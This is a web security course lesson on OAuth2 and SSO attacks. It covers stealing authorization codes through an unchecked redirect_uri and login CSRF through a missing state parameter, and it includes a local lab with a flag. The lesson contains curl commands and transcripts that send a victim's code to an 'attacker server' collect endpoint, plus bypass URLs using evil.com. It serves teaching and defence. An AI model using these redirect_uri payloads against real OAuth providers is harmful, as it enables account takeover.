---
title: "Lesson 4.4: OAuth2 and SSO, redirect_uri and state attacks"
image:
  path: /assets/img/covers/web-4-4-oauth2-sso-redirect-uri-state-attacks.webp
  alt: "OAuth2 and SSO, redirect_uri and state attacks"
date: 2024-06-15 12:20:00 +0700
categories: ["Web Security", "Web · Authentication and Session"]
tags: [web, oauth, sso]
render_with_liquid: false
---

OAuth2 is the standard behind "Log in with Google", and the authorization code it hands out travels through the victim's browser, which is the weak point. If the authorization server does not match `redirect_uri` against an allowlist, the attacker points it at their own server and the victim's code lands there. In this lesson I draw the OAuth2 authorization code flow, exploit a loose `redirect_uri` to steal a victim's authorization code, show how a missing `state` parameter enables login CSRF, and list the channels where codes and tokens leak. The lab runs on your own machine.

![OAuth2 and SSO, redirect_uri and state attacks](/assets/img/web/web-4-4-oauth2-sso-redirect-uri-state-attacks.svg)
_With no allowlist check, the authorization server sends the victim's code to the attacker's redirect_uri, and the attacker exchanges it for a token._

Level: advanced, about 60 minutes. Prerequisites: Lesson 4.2 Session management, redirects and cross-site cookies, Lesson 5.3 CSRF (can be read in parallel). Tools: Burp Suite, curl, Python requests, a request-catching server.

## Goals

After this lesson you can draw the OAuth2 authorization code flow and the roles of resource owner, client, and authorization server. You can exploit a loosely checked `redirect_uri` to steal a victim's authorization code, understand the `state` parameter and why missing it causes a login-flow CSRF, and recognize the code and token leak channels: Referer, browser history, logs.

## Theory

### What OAuth2 and SSO solve

OAuth2 is an authorization standard that lets one application (the client) access a user's resources on another service without knowing their password. SSO (Single Sign-On) builds on this: you "Log in with Google" into an app, Google authenticates you, and issues the app a token or identity information.

Three main roles:

- **Resource owner:** the end user (for example you).
- **Client (relying party):** the app that wants to log you in (for example a third-party website).
- **Authorization server (IdP, Identity Provider):** where you are authenticated and codes or tokens are issued (for example Google).

### The authorization code flow

The most common and safest flow has these steps:

1. The client redirects your browser to the IdP: `GET /authorize?response_type=code&client_id=...&redirect_uri=...&state=...&scope=...`.
2. You log in to the IdP (if not already) and consent to grant access.
3. The IdP redirects your browser back to `redirect_uri` with a one-time authorization code: `redirect_uri?code=XYZ&state=...`.
4. The client (on the backend) exchanges the code for an access token: `POST /token` with `code`, `client_id`, `client_secret`, `redirect_uri`.
5. The client uses the access token to call `/userinfo` (or an API) and fetch the identity and data.

The security point is that the code is only an intermediate key, passing through the browser (easy to leak), while the access token is exchanged on the backend (more private). Because the code passes through the browser, `redirect_uri` and `state` must be protected carefully.

### Loose redirect_uri

`redirect_uri` decides where the code is sent. The IdP must match this value against an allowlist (the registered list) by exact match. Common mistakes:

- No check at all, only that the `client_id` exists.
- Prefix matching (`startswith`), bypassed with `https://client.app.evil.com` or `https://evil.com/?x=https://client.app`.
- Allowing arbitrary subdomains or paths, abused through an open redirect already present on the client domain.

The consequence: the attacker sets `redirect_uri` to point at their own server and sends the victim (logged in to the IdP) a link to click the `authorize` endpoint. The IdP issues the code and redirects it straight to the attacker's server with `?code=...`. With the code, the attacker exchanges it for a token and takes over the victim's account on the client.

### Missing state causes CSRF

`state` is a random value the client generates before redirecting, binds to the session, and checks again when the IdP returns. It protects the OAuth flow against CSRF by ensuring this `code` response belongs to the session that this same browser started. Without `state`, the attacker performs a login CSRF: forcing the victim's browser to complete the flow with the attacker's code, so the victim logs in to the attacker's account on the client (and then types sensitive data into it), or the reverse is abused to link accounts.

`state` should be a random, unguessable string, used once, and mandatory to check at the callback. (Modern standards also add PKCE, a challenge code to resist code interception, but at the basic level `state` is the minimum.)

### Code and token leaks

Because the `code` (and sometimes the token in the old implicit flow) sits in the URL, it leaks easily:

- **Referer header:** if the callback page loads an external resource (image, script, pixel), the browser sends the current URL (with the code) in the `Referer` header to the third party.
- **Browser history, server logs, proxy logs:** a URL with a code is recorded in many places.
- **Chained open redirect:** if there is one more redirect after the callback that carries the code along.

Ways to reduce it: use the authorization code flow (not implicit), exchange the code immediately and invalidate it, set `Referrer-Policy`, and do not embed external resources on the callback page.

## Demo

Lab 4.4 simulates three components running locally: the provider (IdP) `:8044`, the client `:8045`, and the attacker's server `:8049`. The victim is `carol`, already logged in to the IdP.

### The normal flow for comparison

```text
authorize -> 302 http://localhost:8045/callback?code=04bc79a8d6d8982b
client /callback -> {'email': 'carol@corp.local', 'logged_in_as': 'carol', 'ok': True, ...}
```

The IdP issues the code, redirects it to the client's valid `redirect_uri`, and the client exchanges the code for a token then fetches the identity.

### Stealing the code through redirect_uri

The provider does not check `redirect_uri` against an allowlist. The attacker sends the victim an `authorize` link with `redirect_uri` pointing at `:8049`:

```text
provider 302 to attacker server: http://localhost:8049/collect?code=09c5c9ca2642c16c
[+] attacker server caught the code: 09c5c9ca2642c16c
exchange code -> access_token: 785933614a515f51d5231006
[+] /userinfo of the VICTIM: {'email': 'carol@corp.local', 'flag': 'FLAG{4.4_oauth_code_theft}', 'ok': True, 'user': 'carol'}
```

Carol's code runs straight to the attacker's server. The attacker exchanges the code for an access token and reads carol's `/userinfo`, taking over the account.

A quick test with curl (watch the Location containing the code):

```text
curl -s -c j.txt -X POST localhost:8044/pv-login -d user=carol
curl -si -b j.txt "localhost:8044/authorize?response_type=code&client_id=portal&redirect_uri=http://localhost:8049/collect" | grep -i location
```

### Missing state

```text
client /login -> authorize: .../authorize?response_type=code&client_id=portal&redirect_uri=http://localhost:8045/callback
has a 'state' parameter? NO -> missing CSRF protection
/callback accepts code WITHOUT a state -> True
```

The client does not generate `state` at the `login` step and does not check it at `callback`, so it accepts any code, meeting the condition for login CSRF.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 4.4</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-web/4.4.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-web/4.4/attacker_collector.py" download><i class="fa-solid fa-file-code"></i>attacker_collector.py</a>
<a class="lab-file" href="/assets/labs-web/4.4/client.py" download><i class="fa-solid fa-file-code"></i>client.py</a>
<a class="lab-file" href="/assets/labs-web/4.4/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-web/4.4/provider.py" download><i class="fa-solid fa-file-code"></i>provider.py</a>
</div>
</div>

- Vulnerable app: `labs/4.4/` (README in the lab, runs locally; provider 8044, client 8045, attacker 8049).
- Task: (1) steal carol's authorization code using a `redirect_uri` pointing at your server, (2) exchange the code for a token and read carol's `/userinfo`, (3) prove the client is missing `state`.
- Hints: read the `Location` header of the `authorize` response; exchange the code at `/token` using the exact `redirect_uri` from the authorize step; in an SPA the `client_secret` is often public.
- Solution: `exploit.py` and `transcript.txt` in `labs/4.4/`. The transcript shows carol's account taken over, flag `FLAG{4.4_oauth_code_theft}`.

## Common pitfalls

- Thinking a prefix match on `redirect_uri` is enough; `startswith` can almost always be bypassed.
- Forgetting that an open redirect on the client's own domain turns a valid `redirect_uri` into a code leak channel.
- Skipping `state` because "there is already a cookie"; a cookie cannot replace state's anti-CSRF role.
- Testing only when not logged in to the IdP; many bugs only show when the victim has an IdP session (auto-consent).

## Further reading

- PortSwigger Web Security Academy, the OAuth authentication topic (labs on redirect_uri, state, SSRF via OpenID).
- RFC 6749 (OAuth2), RFC 7636 (PKCE); OAuth 2.0 Security Best Current Practice (RFC 9700).
- OWASP WSTG, Testing for OAuth weaknesses.
- Related: Lesson 6.3 Open redirect, Lesson 5.3 CSRF.

## Key takeaways

- `redirect_uri` must match an allowlist exactly; try subdomains, extra paths, open redirects, and a completely different value.
- `state` must exist, be random, be used once, and be checked at the callback.
- The code passes through the browser so it leaks easily; check Referer, logs, history, and chained redirects.
- Prefer the authorization code flow with PKCE; avoid the implicit flow (token in the URL).
- Try replaying a code and using a code from one flow against a different client or redirect.
